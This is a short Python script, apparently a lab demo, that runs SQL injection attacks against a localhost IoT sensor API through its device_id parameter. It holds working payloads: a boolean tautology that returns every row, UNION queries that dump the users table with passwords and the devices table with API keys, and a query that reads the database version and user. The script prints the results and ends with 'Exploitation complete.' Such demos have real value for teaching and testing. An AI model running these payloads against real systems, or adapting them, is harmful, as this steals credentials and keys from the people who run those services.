import requests
import json

BASE_URL = "http://localhost/iot_rest/api/sensors.php"


def send_payload(label, payload):
    print(f"\n{'='*60}")
    print(f"[ATTACK] {label}")
    print(f"[PAYLOAD] device_id={payload}")
    print("-" * 60)

    try:
        response = requests.get(BASE_URL, params={"device_id": payload}, timeout=5)
        data = response.json()
        print(f"[HTTP {response.status_code}]")
        print(json.dumps(data, indent=2))
    except Exception as e:
        print(f"[ERROR] {e}")


def main():
    print("=" * 60)
    print("  SQL Injection Attack Demo")
    print("  Target: GET /api/sensors.php?device_id=")
    print("=" * 60)

    send_payload(
        "Boolean SQLi – return all rows for all devices",
        "SENSOR_01' OR '1'='1"
    )

    send_payload(
        "UNION-based SQLi – dump users table",
        "nonexistent' UNION SELECT id, username, password, role, created_at FROM users-- "
    )

    send_payload(
        "UNION-based SQLi – dump device API keys",
        "nonexistent' UNION SELECT id, device_id, device_name, api_key, created_at FROM devices-- "
    )

    send_payload(
        "Blind SQLi – retrieve MySQL version",
        "nonexistent' UNION SELECT 1, VERSION(), DATABASE(), USER(), NOW()-- "
    )

    print("\n" + "=" * 60)
    print("[DONE] Exploitation complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
